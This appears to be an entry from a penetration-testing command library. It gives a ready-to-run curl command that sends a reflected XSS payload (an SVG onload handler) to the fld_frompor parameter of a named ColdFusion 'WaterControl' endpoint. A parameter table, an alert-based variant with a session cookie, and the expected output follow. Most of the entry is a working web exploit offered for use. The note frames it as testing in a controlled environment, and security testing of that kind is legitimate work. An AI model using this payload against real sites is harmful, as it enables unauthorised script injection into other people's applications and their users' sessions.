---
data: >-
  curl -X POST
  'https://target-domain/WaterControl/shefgraph-historic.cfm?sid=BL110' -d
  'fld_frompor=1\"<!--><Svg OnLoad=(confirm)(1)><!--' -d 'other_params=values'
  --cookie 'session_cookie=value'
tags:
  - xss
  - web
  - post-request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e075e873-55a6-4075-a3df-a1a76d607f80
created_at: '2025-12-14T00:11:15.832Z'
updated_at: '2025-12-14T00:11:15.832Z'
verified: false
validated: true
submitted: true
---
# send-xss-post-via-curl

## Command

```bash
curl -X POST 'https://target-domain/WaterControl/shefgraph-historic.cfm?sid=BL110' \
  -d 'fld_frompor=1\"<!--><Svg OnLoad=(confirm)(1)><!--' \
  -d 'other_params=values' \
  --cookie 'session_cookie=value'
```

## Description

This command uses curl to send a malicious POST request exploiting reflected XSS in the 'fld_frompor' parameter of a ColdFusion web application. It injects a payload that escapes HTML attributes and executes JavaScript via SVG onload. Use it to test or trigger XSS in a controlled environment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://target-domain/...'` | The vulnerable endpoint URL | Yes |
| `-d 'fld_frompor=...'` | The malicious payload in the parameter | Yes |
| `-d 'other_params=values'` | Additional form parameters as needed | No |
| `--cookie` | Session cookie for authenticated testing | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.com/endpoint' -d 'fld_frompor=test'
```

Test reflection with benign input.

### Advanced Usage

```bash
curl -X POST 'https://target/WaterControl/shefgraph-historic.cfm?sid=BL110' \
  -d 'fld_frompor=1\"<!--><Svg OnLoad=(alert(`XSS`))><!--' \
  --cookie 'JSESSIONID=abc123' -v
```

Injects alert for verification, with verbose output (-v) to inspect response.

## Expected Output

The command outputs the server's HTML response. Look for the reflected payload in the HTML source. Successful XSS triggers JavaScript execution in the browser (if proxied or viewed), such as a confirm/alert dialog. Errors indicate blocking or invalid payload.

## Related

- [[procedures/Exploiting-Reflected-XSS-in-fld_frompor-Parameter]]
